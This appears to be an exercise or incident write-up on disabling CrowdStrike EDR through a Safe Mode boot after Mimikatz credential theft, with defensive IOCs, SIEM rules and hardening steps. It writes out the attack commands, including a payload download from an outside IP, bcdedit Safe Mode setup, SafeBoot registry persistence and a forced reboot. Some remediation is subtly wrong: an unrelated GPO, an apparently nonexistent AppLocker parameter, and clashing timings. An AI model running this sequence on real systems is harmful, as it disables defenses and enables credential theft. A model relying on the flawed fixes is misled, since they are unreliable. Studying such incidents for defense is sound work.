# EDR Evasion & Disabling Sequence
## Safe Mode Boot Technique - CrowdStrike Bypass
**Exercise Author**: Andy Macready 
**Latest Update**: February 15, 2026  

## **ðŸŽ¯ Why EDR Failed BEFORE Evasion Attempt**

### **Critical Discovery:**
The EDR evasion sequence (Safe Mode boot) occurred **AFTER** the attacker had already:
1. âœ… Executed Mimikatz (10:48:12) - **EDR did NOT block**
2. âœ… Accessed LSASS memory (10:48:13) - **EDR did NOT block**  
3. âœ… Stolen credentials (10:48:13-18) - **EDR did NOT prevent**
4. âš ï¸ EDR generated first alert (10:49:25) - **112 seconds TOO LATE**

### **Timeline Evidence:**

```
10:48:12.5 - Process_Create: svchost.exe (Mimikatz)
             Command: privilege::debug sekurlsa::logonpasswords exit
             EDR STATUS: Running, NO ALERT

10:48:13.2 - Sysmon Event 10: Process_Access to lsass.exe
             Result: SUCCESSFUL (marked "Benign" in logs)
             EDR STATUS: Running, NO ALERT

10:48:14.6 - Sysmon Event 8: CreateRemoteThread to lsass.exe
             Result: SUCCESSFUL (marked "Benign" in logs)
             EDR STATUS: Running, NO ALERT

10:48:18.2 - Process_Terminate: svchost.exe (Mimikatz exits)
             Credentials already stolen
             EDR STATUS: Running, NO ALERT

10:49:25.7 - FIRST EDR ALERT GENERATED
             Detection: Tamper Protection Violation (T1562.001)
             TOO LATE - Credentials stolen 72 seconds earlier
```

---

## **ðŸ”´ CRITICAL FINDING: EDR WAS BYPASSED WITHOUT SAFE MODE**

### **The Attack Succeeded Because:**

**1. Missing Host-Based Protections**
- âŒ Windows Credential Guard: NOT ENABLED
- âŒ LSASS Protected Process Light (PPL): NOT ENABLED
- âŒ Attack Surface Reduction (ASR) Rules: NOT CONFIGURED

**Without these protections**, CrowdStrike operated in **detection-only mode** for LSASS access.

**2. Behavioral Detection Too Slow**
- Attack completed in: **6 seconds** (10:48:12 â†’ 10:48:18)
- EDR alert generated in: **112 seconds** (10:49:25)
- **18x slower** than attack execution

**3. File Masquerading Worked**
- Mimikatz saved as: `svchost.exe` (legitimate Windows process name)
- Location: `C:\Users\sarah.mitchell\AppData\Local\Temp\`
- Signature-based detection: BYPASSED

**4. PowerShell Detection-Only Mode**
- Obfuscated PowerShell: LOGGED but NOT BLOCKED
- Configuration: Monitor-only to avoid false positives
- Result: Initial payload executed successfully

---

## **ðŸ“‹ Actual Attack Timeline**

### **Phase 1: Initial Compromise - EDR FAILED TO PREVENT (10:47:33 - 10:48:18)**

**10:47:33** - Obfuscated PowerShell execution
```powershell
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand [BASE64]
```
- Parent: OUTLOOK.EXE
- **EDR Action**: Logged, NO BLOCK

**10:47:36** - Mimikatz download
```
Source: http://185.220.101.42/tools/mimikatz.exe
Target: C:\Users\sarah.mitchell\AppData\Local\Temp\svchost.exe
```
- **EDR Action**: File creation logged, NO BLOCK

**10:48:12** - Mimikatz execution
```
Command: privilege::debug sekurlsa::logonpasswords exit
```
- **EDR Action**: Process start logged, NO BLOCK

**10:48:13** - ðŸš¨ **LSASS MEMORY ACCESS - CREDENTIALS STOLEN**
```
Sysmon Event 10: Process_Access to lsass.exe
Sysmon Event 8: CreateRemoteThread to lsass.exe
```
- **EDR Action**: Logged as "Benign", NO ALERT, NO BLOCK
- **Result**: jennifer.hayes credentials extracted

**10:48:18** - Mimikatz terminates
- **Damage Done**: Domain Admin credentials stolen
- **EDR Status**: Still analyzing, no alert yet

---

### **Phase 2: EDR Discovery - Attacker Realizes EDR is Still Active (10:49:00 - 10:49:10)**

**Why did the attacker enumerate EDR?**
Because they **successfully stole credentials** and wanted to ensure they could continue operations.

**10:49:00** - Enumerate security products
```powershell
Get-Process | Where-Object {$_.ProcessName -like "*CrowdStrike*" -or $_.ProcessName -like "CSFalcon*"}
```
**Found:**
- CSFalconService (PID: 1844)
- CSFalconContainer (PID: 2156)
- **Status**: RUNNING (despite not blocking credential theft)

**10:49:05** - Check service status
```powershell
Get-Service -Name "CSFalcon*"
```
**Result:**
- DisplayName: CrowdStrike Falcon Sensor
- Status: Running
- StartType: Automatic
- âš ï¸ **Tamper Protection: ENABLED**

**10:49:10** - Check kernel driver
```powershell
Get-CimInstance -ClassName "Win32_SystemDriver" | Where-Object {$_.Name -like "CSAgent"}
```
**Result:**
- Driver: CSAgent.sys
- State: Running
- Loaded in kernel mode

**Attacker's Reasoning:**
- "EDR didn't stop me from stealing creds, but it's still running"
- "Better disable it before continuing with lateral movement"
- "Don't want it to catch me during file encryption"

---

### **Phase 3: Direct Disable Attempt - BLOCKED BY TAMPER PROTECTION (10:49:20 - 10:49:25)**

**10:49:20** - Try to stop service
```powershell
Stop-Service -Name "CSFalconService"
```
**Result:** âŒ **BLOCKED**
```
ERROR: Access Denied - Service protected by tamper protection
```

**10:49:25** - ðŸš¨ **FIRST EDR ALERT GENERATED**
```
Detection: Tamper Protection Violation
Technique: T1562.001 (Disable/Modify Tools)
Process: powershell.exe
User: sarah.mitchell
Action: BLOCKED
Severity: CRITICAL
```

**Key Finding:** 
- âœ… Tamper protection **worked** - blocked service stop
- âŒ Credential theft protection **failed** - LSASS access not prevented
- âš ï¸ Alert timing **too slow** - 112 seconds after credential theft

---

### **Phase 4: Safe Mode Boot Technique (10:49:35 - 10:51:31)**

**Now that direct tampering failed, attacker uses sophisticated evasion:**

**10:49:35** - Download EDR removal tool
```powershell
Invoke-WebRequest -Uri "http://185.220.101.42/tools/edr_killer.exe" `
                  -OutFile "C:\Windows\Temp\winupdate.exe"
```

**10:49:42** - Configure Safe Mode boot
```powershell
bcdedit /set {current} safeboot network
```
**Why this works:**
- Safe Mode loads minimal drivers
- EDR kernel drivers (CSAgent.sys) NOT loaded in Safe Mode
- Legitimate Windows feature - can't be "patched"

**10:49:45** - CrowdStrike detects boot modification
```
Detection: Boot Configuration Modification
Technique: T1562.009 (Safe Mode Boot)
Process: bcdedit.exe
Command: safeboot network
User: sarah.mitchell
Severity: CRITICAL
Action: LOGGED (cannot block bcdedit - it's a Microsoft signed binary)
```

**10:49:48** - Create Safe Mode persistence
```powershell
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WinUpdate" `
                 -Name "Default" `
                 -Value "C:\Windows\Temp\winupdate.exe"
```
**Purpose:** Ensure EDR killer runs when Safe Mode starts

**10:49:53** - Force system restart
```powershell
shutdown /r /t 0 /f
```

**10:51:00** - System boots in Safe Mode
```
Boot Mode: Safe Mode with Networking
EDR Status: Drivers NOT loaded (kernel drivers disabled in Safe Mode)
Network: Available (for winupdate.exe communication)
```

**10:51:15** - EDR removal tool executes (as SYSTEM in Safe Mode)
```
Process: C:\Windows\Temp\winupdate.exe
Parent: wininit.exe
User: SYSTEM
Action: Delete CrowdStrike files, services, and registry keys
EDR Status: OFFLINE (drivers not loaded, cannot protect itself)
```

**10:51:31** - Restore normal boot and restart
```powershell
bcdedit /deletevalue {current} safeboot
shutdown /r /t 0
```

**10:52:00** - System reboots to normal mode
```
Boot Mode: Normal
EDR Status: REMOVED (service not found, driver deleted)
```

**Verification:**
```powershell
Get-Service -Name "CSFalcon*"
# ERROR: Cannot find service
```

**Result:** CrowdStrike successfully removed from system

---

## **ðŸ”´ WHY SAFE MODE BOOT WORKS**

### **Technical Explanation:**

**Normal Boot:**
```
Windows Kernel
â”œâ”€ CSAgent.sys (CrowdStrike kernel driver) âœ… LOADED
â”œâ”€ CSFalconService.exe âœ… RUNNING
â”œâ”€ Tamper Protection âœ… ACTIVE
â””â”€ Real-time Protection âœ… ACTIVE
```

**Safe Mode Boot:**
```
Windows Kernel (Minimal)
â”œâ”€ CSAgent.sys âŒ NOT LOADED (kernel drivers disabled)
â”œâ”€ CSFalconService.exe âŒ NOT RUNNING
â”œâ”€ Tamper Protection âŒ INACTIVE
â””â”€ Real-time Protection âŒ INACTIVE
```

### **Why EDR Can't Stop It:**

1. **Legitimate Windows Feature**
   - Safe Mode is designed to load minimal drivers
   - Microsoft's design choice, not a vulnerability
   - Cannot be "patched" or "fixed"

2. **bcdedit is Signed by Microsoft**
   - EDR cannot block Microsoft-signed binaries
   - Would cause massive false positives
   - Can only LOG the attempt

3. **Kernel Drivers Don't Load**
   - Safe Mode explicitly excludes third-party kernel drivers
   - CSAgent.sys (CrowdStrike driver) won't load
   - No kernel-level protection available

4. **Tamper Protection Doesn't Work**
   - Tamper protection relies on running EDR service
   - In Safe Mode, service isn't running
   - Files can be deleted without protection

---

## **DETECTION VS PREVENTION: WHAT WORKED, WHAT FAILED**

### **âœ… What EDR Got Right:**

| Component | Result |
|-----------|--------|
| Tamper Protection (Normal Mode) | âœ… BLOCKED service stop attempt |
| Boot Modification Detection | âœ… DETECTED bcdedit command |
| Event Logging | âœ… All events logged in Sysmon/Windows |
| Eventually Generated Alert | âœ… Alerted on tamper attempt (10:49:25) |

### **âŒ What EDR Failed At:**

| Component | Result |
|-----------|--------|
| **LSASS Protection** | âŒ **CRITICAL FAILURE - Did NOT block credential theft** |
| **PowerShell Prevention** | âŒ FAILED - Obfuscated commands executed |
| **File Masquerading Detection** | âŒ FAILED - svchost.exe (Mimikatz) not blocked |
| **Behavioral Analysis Speed** | âŒ FAILED - 112 seconds too slow |
| **Safe Mode Boot Prevention** | âŒ CANNOT PREVENT - Legitimate Windows feature |

---

## **ROOT CAUSE: WHY LSASS WAS NOT PROTECTED**

### **Missing Windows Native Protections:**

**1. Windows Credential Guard - NOT ENABLED**
```
Status: DISABLED
Impact: LSASS memory readable by user-mode processes
```

**Without Credential Guard:**
- LSASS process runs as standard process
- Memory can be read by any process with SeDebugPrivilege
- Mimikatz can extract plaintext credentials
- **EDR can only DETECT, not PREVENT**

**2. LSASS Protected Process Light (PPL) - NOT ENABLED**
```
Status: DISABLED
Impact: LSASS can be accessed without special signing
```

**Without PPL:**
- No code-signing requirements for LSASS access
- Standard Mimikatz works without modification
- Process injection possible
- **EDR operates in detection-only mode**

**3. Attack Surface Reduction (ASR) Rules - NOT CONFIGURED**
```
Rule: Block credential stealing from LSASS
Status: NOT ENABLED
Impact: No OS-level blocking of LSASS access
```

**Without ASR:**
- No Windows Defender integration
- No automatic blocking of suspicious LSASS access
- Relies entirely on EDR behavioral detection
- **Windows doesn't enforce protection**

---

## **COMPLETE MITRE ATT&CK MAPPING**

| Tactic | Technique | Implementation | EDR Response |
|--------|-----------|----------------|--------------|
| **Credential Access** | T1003.001 - LSASS Memory | Mimikatz sekurlsa::logonpasswords | âŒ FAILED - Not prevented |
| **Defense Evasion** | T1027 - Obfuscated Files | Base64 PowerShell encoding | âŒ FAILED - Executed successfully |
| **Defense Evasion** | T1036.005 - Masquerading | Mimikatz as svchost.exe | âŒ FAILED - Not detected |
| **Defense Evasion** | T1562.001 - Disable Tools | Attempted service stop | âœ… SUCCESS - Blocked by tamper protection |
| **Defense Evasion** | T1562.009 - Safe Mode Boot | bcdedit safeboot network | âš ï¸ DETECTED but cannot prevent |
| **Persistence** | T1547.001 - Registry Run Keys | Safe Mode persistence registry | âœ… DETECTED in logs |

---

## **INDICATORS OF COMPROMISE (IOCs)**

### **Pre-Evasion (Credential Theft):**
```
C:\Users\sarah.mitchell\AppData\Local\Temp\svchost.exe (Mimikatz)
Process: svchost.exe with arguments "privilege::debug sekurlsa::logonpasswords"
Network: 185.220.101.42 (Mimikatz download source)
```

### **EDR Evasion:**
```
C:\Windows\Temp\winupdate.exe (EDR removal tool)
Registry: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WinUpdate
Command: bcdedit /set {current} safeboot network
Network: http://185.220.101.42/tools/edr_killer.exe
```

### **Process Execution Chain:**
```
OUTLOOK.EXE
â””â”€ powershell.exe (obfuscated)
    â””â”€ svchost.exe (Mimikatz) â†’ LSASS accessed âŒ NOT BLOCKED
    
powershell.exe
â””â”€ bcdedit.exe (Safe Mode configuration)
â””â”€ shutdown.exe (forced reboot)

wininit.exe (Safe Mode)
â””â”€ winupdate.exe (EDR removal as SYSTEM)
```

---

## **CRITICAL LESSONS LEARNED**

### **1. EDR â‰  LSASS Protection**

**MYTH:** "We have CrowdStrike, so Mimikatz won't work"  
**REALITY:** EDR detected but did NOT prevent credential theft

**Why:**
- EDR relies on Windows Credential Guard to PREVENT LSASS access
- Without Credential Guard, EDR can only DETECT (too slow)
- Behavioral analysis took 112 seconds - attack took 6 seconds

### **2. Defense-in-Depth is MANDATORY**

**Single Layer Failed:**
- âŒ EDR alone: Failed to prevent credential theft
- âŒ EDR alone: Cannot stop Safe Mode boot
- âŒ EDR alone: Detection too slow for rapid attacks

**Multiple Layers Required:**
- âœ… EDR + Credential Guard + LSASS PPL + ASR Rules
- âœ… Prevention at OS level (Credential Guard)
- âœ… Detection at EDR level (CrowdStrike)
- âœ… Application controls (AppLocker, Constrained Language Mode)

### **3. Safe Mode is a Legitimate Bypass**

**Cannot be "Fixed":**
- Safe Mode is a Windows feature, not a bug
- EDR kernel drivers won't load by design
- bcdedit is Microsoft-signed (cannot block)
- Only detection possible, not prevention

**Mitigation:**
- GPO: Restrict Safe Mode boot (require password)
- Monitor: Alert on bcdedit commands
- Response: Immediate investigation of Safe Mode boots
- Architecture: Network segmentation to limit damage

### **4. Detection Speed Matters**

**Timeline:**
- Attack execution: **6 seconds**
- EDR detection: **112 seconds**
- **Gap: 18x too slow**

**Implication:**
- Behavioral analytics are NOT fast enough for credential theft
- MUST prevent at OS level (Credential Guard)
- Cannot rely on post-execution detection

---

## **IMMEDIATE CORRECTIVE ACTIONS**

### **ðŸ”´ CRITICAL (Implement Immediately):**

1. **Enable Windows Credential Guard on ALL workstations**
   ```powershell
   # Group Policy: Computer Configuration -> Administrative Templates ->
   # System -> Device Guard -> Turn On Virtualization Based Security
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
                    -Name "LsaCfgFlags" -Value 1
   ```

2. **Enable LSASS Protected Process Light (PPL)**
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
                    -Name "RunAsPPL" -Value 1
   ```

3. **Enable Attack Surface Reduction Rules**
   ```powershell
   # Block credential stealing from LSASS
   Add-MpPreference -AttackSurfaceReductionRules_Ids "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" `
                    -AttackSurfaceReductionRules_Actions Enabled
   ```

4. **Restrict Safe Mode Boot via GPO**
   ```
   Computer Configuration -> Windows Settings -> Security Settings -> 
   Local Policies -> Security Options -> 
   "System settings: Require strong (Windows 2000 or later) key protection for user keys stored on the computer"
   ```

5. **Block PowerShell from Outlook**
   ```powershell
   # AppLocker Rule
   New-AppLockerPolicy -RuleType Exe `
                       -User Everyone `
                       -RuleNamePrefix "Block_PS_From_Office" `
                       -DenyExecution `
                       -SourceFilePathCondition "powershell.exe" `
                       -ParentProcessCondition "OUTLOOK.EXE"
   ```

### **ðŸŸ¡ HIGH PRIORITY (1-7 days):**

1. Review CrowdStrike prevention policies (move from detect to prevent where possible)
2. Enable PowerShell Constrained Language Mode
3. Deploy PowerShell script block logging to SIEM
4. Create SIEM rule: Alert on bcdedit Safe Mode commands
5. Implement GPO to alert on Safe Mode boots

### **ðŸŸ¢ MEDIUM PRIORITY (30+ days):**

1. Deploy MFA for all privileged accounts (prevents credential reuse)
2. Implement Privileged Access Workstations (PAWs)
3. Network segmentation (limit lateral movement damage)
4. Regular purple team exercises testing EDR bypass techniques
5. Evaluate supplemental controls beyond EDR

---

## **RECOMMENDATIONS FOR SECURITY ARCHITECTURE**

### **Layered Defense Model:**

```
Layer 1: PREVENT at OS Level
â”œâ”€ Windows Credential Guard (LSASS protection)
â”œâ”€ LSASS PPL (Process protection)
â”œâ”€ Attack Surface Reduction Rules
â””â”€ Application Control (AppLocker/WDAC)

Layer 2: DETECT at EDR Level
â”œâ”€ CrowdStrike/Defender for Endpoint
â”œâ”€ Behavioral analytics
â”œâ”€ Process monitoring
â””â”€ Network traffic analysis

Layer 3: RESPOND with SIEM
â”œâ”€ Log aggregation and correlation
â”œâ”€ Automated response workflows
â”œâ”€ Threat intelligence integration
â””â”€ Incident response playbooks

Layer 4: CONTAIN with Architecture
â”œâ”€ Network segmentation
â”œâ”€ Privileged Access Management
â”œâ”€ Multi-Factor Authentication
â””â”€ Zero Trust principles
```

### **Detection Rules:**

```spl
# SIEM Rule 1: LSASS Access Without Credential Guard
index=windows EventCode=10 TargetImage="*lsass.exe"
| where NOT [credential_guard_enabled]
| eval severity="CRITICAL"
| alert

# SIEM Rule 2: Safe Mode Boot Configuration
index=windows EventCode=4688 Image="*bcdedit.exe"
| search CommandLine="*safeboot*"
| eval severity="CRITICAL", technique="T1562.009"
| alert

# SIEM Rule 3: Rapid LSASS Access (Mimikatz behavior)
index=windows EventCode=10 TargetImage="*lsass.exe"
| transaction SourceProcessId maxspan=30s
| where eventcount > 5
| eval severity="HIGH", technique="T1003.001"
| alert
```

---

## **CONCLUSION**

This incident demonstrates **two critical security failures**:

### **1. EDR Failed to Prevent Credential Theft**
- CrowdStrike was running but did NOT block LSASS access
- **Root Cause:** Windows Credential Guard not enabled
- **Result:** Mimikatz succeeded in 6 seconds
- **EDR Alert:** Generated 112 seconds too late

### **2. EDR Cannot Prevent Safe Mode Bypass**
- Safe Mode is a legitimate Windows feature
- EDR kernel drivers don't load in Safe Mode
- **Only detection possible, prevention impossible**
- **Mitigation:** Restrict Safe Mode boot, rapid response

### **Key Takeaway:**

**EDR PRESENCE â‰  EDR PROTECTION**

Organizations MUST implement:
- âœ… OS-level protections (Credential Guard, LSASS PPL)
- âœ… Application controls (PowerShell restrictions)
- âœ… Network segmentation (limit lateral movement)
- âœ… MFA (prevent credential reuse)
- âœ… Rapid detection and response (SIEM correlation)

**EDR is ONE layer in a defense-in-depth strategy, not the only layer.**

---



